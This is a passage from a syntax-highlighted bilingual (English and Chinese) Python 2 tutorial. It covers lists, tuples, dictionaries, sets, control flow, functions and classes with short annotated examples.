查询第一个值出现的位置</span></span><br><span class="line">li.index(<span class="number">2</span>)  <span class="comment"># =&gt; 3</span></span><br><span class="line">li.index(<span class="number">7</span>)  <span class="comment"># Raises a ValueError as 7 is not in the list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for existence in a list with "in"</span></span><br><span class="line"><span class="comment"># 使用 in 来查询列表中是否存在某值</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">in</span> li   <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Examine the length with "len()"</span></span><br><span class="line"><span class="comment"># 使用 len()来查询列表长度</span></span><br><span class="line">len(li)   <span class="comment"># =&gt; 6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tuples are like lists but are immutable.</span></span><br><span class="line"><span class="comment"># 元组像是不能改变的列表</span></span><br><span class="line">tup = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">tup[<span class="number">0</span>]   <span class="comment"># =&gt; 1</span></span><br><span class="line">tup[<span class="number">0</span>] = <span class="number">3</span>  <span class="comment"># Raises a TypeError</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can do all those list thingies on tuples too</span></span><br><span class="line"><span class="comment"># 列表的操作也可以使用在元组上</span></span><br><span class="line">len(tup)   <span class="comment"># =&gt; 3</span></span><br><span class="line">tup + (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)   <span class="comment"># =&gt; (1, 2, 3, 4, 5, 6)</span></span><br><span class="line">tup[:<span class="number">2</span>]   <span class="comment"># =&gt; (1, 2)</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">in</span> tup   <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can unpack tuples (or lists) into variables</span></span><br><span class="line"><span class="comment"># 可以把元组或者列表中的值复制给多个变量</span></span><br><span class="line">a, b, c = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)     <span class="comment"># a is now 1, b is now 2 and c is now 3</span></span><br><span class="line"><span class="comment"># Tuples are created by default if you leave out the parentheses</span></span><br><span class="line"><span class="comment"># 如果没有括号的话会建立元组</span></span><br><span class="line">d, e, f = <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line"><span class="comment"># Now look how easy it is to swap two values</span></span><br><span class="line"><span class="comment"># 交换两个值</span></span><br><span class="line">e, d = d, e     <span class="comment"># d is now 5 and e is now 4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dictionaries store mappings</span></span><br><span class="line"><span class="comment"># 字典储存映射关系</span></span><br><span class="line">empty_dict = &#123;&#125;</span><br><span class="line"><span class="comment"># Here is a prefilled dictionary</span></span><br><span class="line"><span class="comment"># 创建一个字典</span></span><br><span class="line">filled_dict = &#123;<span class="string">"one"</span>: <span class="number">1</span>, <span class="string">"two"</span>: <span class="number">2</span>, <span class="string">"three"</span>: <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Look up values with []</span></span><br><span class="line"><span class="comment"># 用[]来查询对应值</span></span><br><span class="line">filled_dict[<span class="string">"one"</span>]   <span class="comment"># =&gt; 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all keys as a list with "keys()"</span></span><br><span class="line"><span class="comment"># 把所有键名导出为列表</span></span><br><span class="line">filled_dict.keys()   <span class="comment"># =&gt; ["three", "two", "one"]</span></span><br><span class="line"><span class="comment"># Note - Dictionary key ordering is not guaranteed.</span></span><br><span class="line"><span class="comment"># 注意：字典没有顺序</span></span><br><span class="line"><span class="comment"># Your results might not match this exactly.</span></span><br><span class="line"><span class="comment"># 得到的结果可能和上面不一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all values as a list with "values()"</span></span><br><span class="line"><span class="comment"># 把所有键值导出为列表</span></span><br><span class="line">filled_dict.values()   <span class="comment"># =&gt; [3, 2, 1]</span></span><br><span class="line"><span class="comment"># Note - Same as above regarding key ordering.</span></span><br><span class="line"><span class="comment"># 注意：没有顺序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for existence of keys in a dictionary with "in"</span></span><br><span class="line"><span class="comment"># 使用 in 来查询是否有某个键名</span></span><br><span class="line"><span class="string">"one"</span> <span class="keyword">in</span> filled_dict   <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">in</span> filled_dict   <span class="comment"># =&gt; False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Looking up a non-existing key is a KeyError</span></span><br><span class="line"><span class="comment"># 查询不存在的键名会报错</span></span><br><span class="line">filled_dict[<span class="string">"four"</span>]   <span class="comment"># KeyError</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use "get()" method to avoid the KeyError</span></span><br><span class="line"><span class="comment"># 用 get() 来避免查询报错</span></span><br><span class="line">filled_dict.get(<span class="string">"one"</span>)   <span class="comment"># =&gt; 1</span></span><br><span class="line">filled_dict.get(<span class="string">"four"</span>)   <span class="comment"># =&gt; None</span></span><br><span class="line"><span class="comment"># The get method supports a default argument when the value is missing</span></span><br><span class="line"><span class="comment"># get() 方法可以设置一个默认值，在没有这个键名的时候有返回值</span></span><br><span class="line">filled_dict.get(<span class="string">"one"</span>, <span class="number">4</span>)   <span class="comment"># =&gt; 1</span></span><br><span class="line">filled_dict.get(<span class="string">"four"</span>, <span class="number">4</span>)   <span class="comment"># =&gt; 4</span></span><br><span class="line"><span class="comment"># note that filled_dict.get("four") is still =&gt; None</span></span><br><span class="line"><span class="comment"># 注意这个默认值不会改变，现在还是 None</span></span><br><span class="line"><span class="comment"># (get doesn't set the value in the dictionary)</span></span><br><span class="line"><span class="comment"># get() 不会向字典中插入值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set the value of a key with a syntax similar to lists</span></span><br><span class="line"><span class="comment"># 向字典中插入键对</span></span><br><span class="line">filled_dict[<span class="string">"four"</span>] = <span class="number">4</span>  <span class="comment"># now, filled_dict["four"] =&gt; 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># "setdefault()" inserts into a dictionary only if the given key isn't present</span></span><br><span class="line"><span class="comment"># Setdefault() 只能在值不存在时添加到字典里</span></span><br><span class="line">filled_dict.setdefault(<span class="string">"five"</span>, <span class="number">5</span>)  <span class="comment"># filled_dict["five"] is set to 5 没有值的时候添加</span></span><br><span class="line">filled_dict.setdefault(<span class="string">"five"</span>, <span class="number">6</span>)  <span class="comment"># filled_dict["five"] is still 5 有值的时候不变</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets store ... well sets (which are like lists but can contain no duplicates)</span></span><br><span class="line"><span class="comment"># 用 set() 来储存集合，像是列表一样，但是不能复制值</span></span><br><span class="line">empty_set = set()</span><br><span class="line"><span class="comment"># Initialize a "set()" with a bunch of values</span></span><br><span class="line"><span class="comment"># 用值来初始化 set()</span></span><br><span class="line">some_set = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])   <span class="comment"># some_set is now set([1, 2, 3, 4])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># order is not guaranteed, even though it may sometimes look sorted</span></span><br><span class="line"><span class="comment"># 初始化之后进行的储存都存不进去</span></span><br><span class="line">another_set = set([<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>])  <span class="comment"># another_set is now set([1, 2, 3, 4])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Since Python 2.7, &#123;&#125; can be used to declare a set</span></span><br><span class="line"><span class="comment"># 从 Python 2.7 开始，&#123;&#125; 可以用来声明一个集合</span></span><br><span class="line">filled_set = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;   <span class="comment"># =&gt; &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add more items to a set</span></span><br><span class="line"><span class="comment"># 把更多的元素添加进一个集合</span></span><br><span class="line">filled_set.add(<span class="number">5</span>)   <span class="comment"># filled_set is now &#123;1, 2, 3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Do set intersection with &amp;</span></span><br><span class="line"><span class="comment"># 使用 &amp; 来获取交集</span></span><br><span class="line">other_set = &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">filled_set &amp; other_set   <span class="comment"># =&gt; &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Do set union with |</span></span><br><span class="line"><span class="comment"># 使用 | 来获取并集</span></span><br><span class="line">filled_set | other_set   <span class="comment"># =&gt; &#123;1, 2, 3, 4, 5, 6&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Do set difference with -</span></span><br><span class="line"><span class="comment"># 使用 - 来获取补集</span></span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125; - &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>&#125;   <span class="comment"># =&gt; &#123;1, 4&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Do set symmetric difference with ^</span></span><br><span class="line"><span class="comment"># 用 ^ 来取交集的补集</span></span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125; ^ &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>&#125;  <span class="comment"># =&gt; &#123;1, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if set on the left is a superset of set on the right</span></span><br><span class="line"><span class="comment"># 右边是否是左边的子集</span></span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>&#125; &gt;= &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment"># =&gt; False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if set on the left is a subset of set on the right</span></span><br><span class="line"><span class="comment"># 左边是否是右边的子集</span></span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>&#125; &lt;= &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for existence in a set with in</span></span><br><span class="line"><span class="comment"># 使用 in 来检查是否存在于某个集合中</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">in</span> filled_set   <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">in</span> filled_set   <span class="comment"># =&gt; False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 3. Control Flow</span></span><br><span class="line"><span class="comment">## 3. 控制流</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Let's just make a variable</span></span><br><span class="line"><span class="comment"># 创建一个变量</span></span><br><span class="line">some_var = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Here is an if statement. Indentation is significant in python!</span></span><br><span class="line"><span class="comment"># 这里有个条件语句，缩进在 Python 当中很重要。</span></span><br><span class="line"><span class="comment"># prints "some_var is smaller than 10"</span></span><br><span class="line"><span class="comment"># 打印"some_var is smaller than 10"</span></span><br><span class="line"><span class="keyword">if</span> some_var &gt; <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"some_var is totally bigger than 10."</span></span><br><span class="line"><span class="keyword">elif</span> some_var &lt; <span class="number">10</span>:    <span class="comment"># This elif clause is optional. elif 子句可选。</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"some_var is smaller than 10."</span></span><br><span class="line"><span class="keyword">else</span>:           <span class="comment"># This is optional too.这句也是可选的。</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"some_var is indeed 10."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">For loops iterate over lists</span></span><br><span class="line"><span class="string">prints:</span></span><br><span class="line"><span class="string">    dog is a mammal</span></span><br><span class="line"><span class="string">    cat is a mammal</span></span><br><span class="line"><span class="string">    mouse is a mammal</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> animal <span class="keyword">in</span> [<span class="string">"dog"</span>, <span class="string">"cat"</span>, <span class="string">"mouse"</span>]:</span><br><span class="line">    <span class="comment"># You can use &#123;0&#125; to interpolate formatted strings. (See above.)</span></span><br><span class="line">    <span class="comment"># 使用 &#123;0&#125; 来格式化字符串</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"&#123;0&#125; is a mammal"</span>.format(animal)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">"range(number)" returns a list of numbers</span></span><br><span class="line"><span class="string">from zero to the given number</span></span><br><span class="line"><span class="string">prints:</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">"range(lower, upper)" returns a list of numbers</span></span><br><span class="line"><span class="string">from the lower number to the upper number</span></span><br><span class="line"><span class="string">prints:</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">While loops go until a condition is no longer met.</span></span><br><span class="line"><span class="string">prints:</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x &lt; <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">print</span> x</span><br><span class="line">    x += <span class="number">1</span>  <span class="comment"># Shorthand for x = x + 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle exceptions with a try/except block</span></span><br><span class="line"><span class="comment"># 使用 try/except 代码块来处理异常</span></span><br><span class="line"><span class="comment"># Works on Python 2.6 and up:</span></span><br><span class="line"><span class="comment"># 适用于 Python 2.6 及以上版本：</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Use "raise" to raise an error</span></span><br><span class="line">    <span class="comment"># 使用 raise 来抛出错误</span></span><br><span class="line">    <span class="keyword">raise</span> IndexError(<span class="string">"This is an index error"</span>)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span>    <span class="comment"># Pass is just a no-op. Usually you would do recovery here. pass 只是一个空操作。通常你应该在这里做一些恢复工作。</span></span><br><span class="line"><span class="keyword">except</span> (TypeError, NameError):</span><br><span class="line">    <span class="keyword">pass</span>    <span class="comment"># Multiple exceptions can be handled together, if required. 如果需要的话，好几个异常可以一起处理。</span></span><br><span class="line"><span class="keyword">else</span>:   <span class="comment"># Optional clause to the try/except block. Must follow all except blocks 可选的分句，用于处理异常，必须写在所有异常语句之后</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"All good!"</span>   <span class="comment"># Runs only if the code in try raises no exceptions 这里的语句只在没异常的时候运行</span></span><br><span class="line"><span class="keyword">finally</span>: <span class="comment">#  Execute under all circumstances 处理所有情况</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"We can clean up resources here"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instead of try/finally to cleanup resources you can use a with statement 使用 with 来避免出错</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"myfile.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">print</span> line</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 4. Functions</span></span><br><span class="line"><span class="comment">## 4. 函数</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use "def" to create new functions</span></span><br><span class="line"><span class="comment"># 使用 def 来新建函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"x is &#123;0&#125; and y is &#123;1&#125;"</span>.format(x, y)</span><br><span class="line">    <span class="keyword">return</span> x + y    <span class="comment"># Return values with a return statement 返回值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calling functions with parameters</span></span><br><span class="line"><span class="comment"># 调用函数，传入参数</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">6</span>)   <span class="comment"># =&gt; prints out "x is 5 and y is 6" and returns 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Another way to call functions is with keyword arguments</span></span><br><span class="line"><span class="comment"># 调用函数的另一种方式是传入关键字参数</span></span><br><span class="line">add(y=<span class="number">6</span>, x=<span class="number">5</span>)   <span class="comment"># Keyword arguments can arrive in any order. 关键字参数可以以任意顺序传入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can define functions that take a variable number of</span></span><br><span class="line"><span class="comment"># positional args, which will be interpreted as a tuple if you do not use the *</span></span><br><span class="line"><span class="comment"># 你可以定义一个函数，并让它接受可变数量的定位参数，如果你不用 * 的话会被解释为一个元组。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">varargs</span><span class="params">(*args)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line">varargs(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)   <span class="comment"># =&gt; (1, 2, 3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can define functions that take a variable number of</span></span><br><span class="line"><span class="comment"># keyword args, as well, which will be interpreted as a dict if you do not use **</span></span><br><span class="line"><span class="comment"># 你也可以定义一个函数，并让它接受可变数量的关键字参数，如果不用 ** 的话会被解释为一个字典</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyword_args</span><span class="params">(**kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> kwargs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Let's call it to see what happens</span></span><br><span class="line"><span class="comment"># 尝试调用</span></span><br><span class="line">keyword_args(big=<span class="string">"foot"</span>, loch=<span class="string">"ness"</span>)   <span class="comment"># =&gt; &#123;"big": "foot", "loch": "ness"&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can do both at once, if you like</span></span><br><span class="line"><span class="comment"># 你还可以同时使用这两类参数，只要你愿意：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_the_args</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> args</span><br><span class="line">    <span class="keyword">print</span> kwargs</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">all_the_args(1, 2, a=3, b=4) prints:</span></span><br><span class="line"><span class="string">    (1, 2)</span></span><br><span class="line"><span class="string">    &#123;"a": 3, "b": 4&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># When calling functions, you can do the opposite of args/kwargs!</span></span><br><span class="line"><span class="comment"># Use * to expand positional args and use ** to expand keyword args.</span></span><br><span class="line"><span class="comment"># 在调用函数时，定位参数和关键字参数还可以反过来用。</span></span><br><span class="line"><span class="comment"># 使用 * 来展开元组，使用 ** 来展开关键字参数。</span></span><br><span class="line">args = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">kwargs = &#123;<span class="string">"a"</span>: <span class="number">3</span>, <span class="string">"b"</span>: <span class="number">4</span>&#125;</span><br><span class="line">all_the_args(*args)   <span class="comment"># equivalent to foo(1, 2, 3, 4)</span></span><br><span class="line">all_the_args(**kwargs)   <span class="comment"># equivalent to foo(a=3, b=4)</span></span><br><span class="line">all_the_args(*args, **kwargs)   <span class="comment"># equivalent to foo(1, 2, 3, 4, a=3, b=4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># you can pass args and kwargs along to other functions that take args/kwargs</span></span><br><span class="line"><span class="comment"># by expanding them with * and ** respectively</span></span><br><span class="line"><span class="comment"># 各自使用* 和 ** 可以把元组和关键字参数展开传递到其他的函数中。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_all_the_args</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">    all_the_args(*args, **kwargs)</span><br><span class="line">    <span class="keyword">print</span> varargs(*args)</span><br><span class="line">    <span class="keyword">print</span> keyword_args(**kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function Scope</span></span><br><span class="line"><span class="comment"># 函数范围</span></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_x</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="comment"># Local var x not the same as global variable x</span></span><br><span class="line">    <span class="comment"># 这里的 x 是私有变量</span></span><br><span class="line">    x = num <span class="comment"># =&gt; 43</span></span><br><span class="line">    <span class="keyword">print</span> x <span class="comment"># =&gt; 43</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_global_x</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    <span class="keyword">print</span> x <span class="comment"># =&gt; 5</span></span><br><span class="line">    x = num <span class="comment"># global var x is now set to 6</span></span><br><span class="line">    <span class="keyword">print</span> x <span class="comment"># =&gt; 6</span></span><br><span class="line"></span><br><span class="line">set_x(<span class="number">43</span>)</span><br><span class="line">set_global_x(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python has first class functions</span></span><br><span class="line"><span class="comment"># 函数在 Python 中优先级很高</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_adder</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">adder</span><span class="params">(y)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    <span class="keyword">return</span> adder</span><br><span class="line"></span><br><span class="line">add_10 = create_adder(<span class="number">10</span>)</span><br><span class="line">add_10(<span class="number">3</span>)   <span class="comment"># =&gt; 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># There are also anonymous functions</span></span><br><span class="line"><span class="comment"># 匿名函数</span></span><br><span class="line">(<span class="keyword">lambda</span> x: x &gt; <span class="number">2</span>)(<span class="number">3</span>)   <span class="comment"># =&gt; True</span></span><br><span class="line">(<span class="keyword">lambda</span> x, y: x ** <span class="number">2</span> + y ** <span class="number">2</span>)(<span class="number">2</span>, <span class="number">1</span>) <span class="comment"># =&gt; 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># There are built-in higher order functions</span></span><br><span class="line"><span class="comment"># 内建的高阶函数</span></span><br><span class="line">map(add_10, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])   <span class="comment"># =&gt; [11, 12, 13]</span></span><br><span class="line">map(max, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>])   <span class="comment"># =&gt; [4, 2, 3]</span></span><br><span class="line"></span><br><span class="line">filter(<span class="keyword">lambda</span> x: x &gt; <span class="number">5</span>, [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])   <span class="comment"># =&gt; [6, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We can use list comprehensions for nice maps and filters</span></span><br><span class="line"><span class="comment"># 我们可以使用列表推导式来模拟 map 和 filter</span></span><br><span class="line">[add_10(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]  <span class="comment"># =&gt; [11, 12, 13]</span></span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>] <span class="keyword">if</span> x &gt; <span class="number">5</span>]   <span class="comment"># =&gt; [6, 7]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 5. Classes</span></span><br><span class="line"><span class="comment">## 5. 类</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We subclass from object to get a class.</span></span><br><span class="line"><span class="comment"># 我们可以从对象中继承，来得到一个类。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># A class attribute. It is shared by all instances of this class</span></span><br><span class="line">    <span class="comment"># 下面是一个类属性。它将被这个类的所有实例共享。</span></span><br><span class="line"></span><br><span class="line">    species = <span class="string">"H. sapiens"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Basic initializer, this is called when this class is instantiated.</span></span><br><span class="line">    <span class="comment"># 在初始化类的时候构造函数。</span></span><br><span class="line">    <span class="comment"># Note that the double leading and trailing underscores denote objects</span></span><br><span class="line">    <span class="comment"># or attributes that are used by python but that live in user-controlled</span></span><br><span class="line">    <span class="comment"># namespaces. You should not invent such names on your own.</span></span><br><span class="line">    <span class="comment"># 注意： __XXX__ 表示一个类，也可能表示 Python 内置的某个变量，不要轻易修改它。</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="comment"># Assign the argument to the instance's name attribute</span></span><br><span class="line">        <span class="comment"># 把参数赋值为实例的 name 属性</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Initialize property</span></span><br><span class="line">        <span class="comment"># 初始化参数</span></span><br><span class="line">        self.age = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># An instance method. All methods take "self" as the first argument</span></span><br><span class="line">    <span class="comment"># 下面是一个实例方法。所有方法都以 self 作为第一个参数。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self, msg)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;0&#125;: &#123;1&#125;"</span>.format(self.name, msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># A class method is shared among all instances</span></span><br><span class="line">    <span class="comment"># They are called with the calling class as the first argument</span></span><br><span class="line">    <span class="comment"># 类方法会被所有实例共享。</span></span><br><span class="line">    <span class="comment"># 类方法在调用时，会将类本身作为第一个函数传入。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_species</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cls.species</span><br><span class="line"></span><br><span class="line">    <span class="comment"># A static method is called without a class or instance reference</span></span><br><span class="line">    <span class="comment"># 静态方法在调用时，不会传入类或实例的引用。</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">grunt</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"*grunt*"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># A property is just like a getter.</span></span><br><span class="line">    <span class="comment"># It turns the method age() into an read-only attribute</span></span><br><span class="line">    <span class="comment"># of the same name.</span></span><br><span class="line">    <span class="comment"># 参数就像是一个函数，返回一个只读的同名方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This allows the property to be set</span></span><br><span class="line">    <span class="comment"># 设置参数</span></span><br><span class="line"><span class="meta">    @age.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self, age)</span>:</span></span><br><span class="line">        self._age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This allows the property to be deleted</span></span><br><span class="line">    <span class="comment"># 删除参数</span></span><br><span class="line"><span class="meta">    @age.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self._age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Instantiate a class</span></span><br><span class="line"><span class="comment"># 实例化一个类</span></span><br><span class="line">i = Human(name=<span class="string">"Ian"</span>)</span><br><span class="line"><span class="keyword">print</span> i.say(<span class="string">"hi"</span>)     <span class="comment"># prints out "Ian: hi"</span></span><br><span class="line"></span><br><span class="line">j = Human(<span 